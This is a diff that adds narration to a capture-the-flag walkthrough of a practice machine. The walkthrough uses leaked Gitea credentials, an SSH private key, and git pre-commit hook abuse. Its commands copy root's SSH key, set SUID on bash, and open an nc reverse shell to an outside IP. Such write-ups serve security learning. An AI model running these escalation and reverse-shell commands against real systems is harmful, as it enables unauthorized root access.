@@ -1,4 +1,7 @@
 
+![image](https://user-images.githubusercontent.com/105310322/192879606-715b15ea-2054-4b1c-b4da-8abea5567f71.png)
+
+
 ### Tools: Feroxbuster, php
 
 ### Vulnerabilities: PHP, GIT Pre-commit Cron Job
@@ -114,7 +117,7 @@ With file uploads maybe we can create a reverse shell but more on that later.
 
 feroxbuster found a console page and led me down a small rabbit hole of changing the werkzeug pin as well as a possible SSTI.
 
-```
+```console
 └─$ feroxbuster -u http://10.129.59.80/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
 200      GET       40l       81w     1360c http://10.129.59.80/
 308      GET        5l       22w      243c http://10.129.59.80/uploads => http://10.129.59.80/uploads/
@@ -394,9 +397,18 @@ Note: Be sure to change to victim IP to 172.17.0.1 (My ifconfig says 172.17.0.4)
 2022/09/28 17:46:00 client: Connected (Latency 30.852349ms)
 ```
 
+Now we can navigate to http://localhost:3000 and we get a gitea page.
+
 ![image](https://user-images.githubusercontent.com/105310322/192855531-f9c67260-c0e6-49b5-ba14-2fd2b1bbc01f.png)
 
+Next we can find a login page and use the credentials found earlier in the .git files to login
+
+Username:Dev01
+Password:Soulless_Developer#2022
+
 ![image](https://user-images.githubusercontent.com/105310322/192855746-a5fe127e-5ec6-474e-a9fb-995fc8f0c9bd.png)
+
+Then we can navigate through their files and nab the ssh key!
 
 ```console
 -----BEGIN RSA PRIVATE KEY-----
@@ -450,7 +462,11 @@ o5tZ7zb7XTokw+6uF+mQriJqJYjhfJ2oXLjpufS+id3uYsLKnAXX06y4lWqaz72M
 NfYDE7uwRhS1PwQyrMbaurAoI1Dq5n5nl6opIVdc7VlFPfoSjzixpWiVLZFoEbFB
 AE77E1AeujKjRkXLQUO3z0E9fnrOl5dXeh2aJp1f+1Wq2Klti3LTLFkKY4og
 -----END RSA PRIVATE KEY-----
+
 ```
+
+We get a successful login and grab the user flag :)
+
 ```console
 └─$ ssh dev01@10.129.59.80 -i id_rsa
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)
@@ -480,6 +496,8 @@ dev01@opensource:~$ cat user.txt
 0e06****************************
 ```
 
+I transferred over linpeas and pspy as per SOP and found that root was running a pre-commit over a cron job about every minute.
+
 ```console
 /09/28 18:49:01 CMD: UID=0    PID=11820  | git status --porcelain 
 2022/09/28 18:49:01 CMD: UID=???  PID=11821  | ???
@@ -489,12 +507,18 @@ dev01@opensource:~$ cat user.txt
 2022/09/28 18:49:01 CMD: UID=0    PID=11825  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
 ```
 
+GTFO has some good info on this but its not perfect so it needed a little editing.
+
+
 https://gtfobins.github.io/gtfobins/git/
+
+I took a gamble and attempted to get the root ssh keys even though I couldnt confirm they were actually available.
 
 
 ```console
 dev01@opensource:~$ echo "cp /root/.ssh/id_rsa /dev/shm && chmod 777 /dev/shm/id_rsa" >> /home/dev01/.git/hooks/pre-commit
 ```
+But it worked and I got the key and flag!
 
 ```console
 dev01@opensource:~$ cat /dev/shm/id_rsa
@@ -581,6 +605,9 @@ root@opensource:~# cat /root/root.txt
 root@opensource:~# 
 ```
 
+Below are some other versions from other users that I found. I especially like the method of changing the suid bit on bash for PE.
+
+
 ```console
 dev01@opensource:~$ echo "chmod u+s /bin/bash" >> /home/dev01/.git/hooks/pre-commit
 dev01@opensource:~$ ls -la /bin/bash
@@ -593,11 +620,13 @@ uid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01)
 bash-4.4# 
 ```
 
+Last but not least we have a reverse shell!
+
+
 ```
 dev01@opensource:~$ echo '#!/bin/sh' > /home/dev01/.git/hooks/pre-commit && chmod +x /home/dev01/.git/hooks/pre-commit && echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 1234 >/tmp/f' >> /home/dev01/.git/hooks/pre-commit
 ```
-
-```
+```console
 └─$ nc -lvnp 1234                   
 listening on [any] 1234 ...
 connect to [10.10.16.10] from (UNKNOWN) [10.129.59.80] 34330
@@ -606,3 +635,6 @@ connect to [10.10.16.10] from (UNKNOWN) [10.129.59.80] 34330
 5916****************************
 # 
 ```
+Footholds have been pretty difficult for me lately but its nice to get some help. 
+
+GG everyone and I hoped you all learned something as I did :)
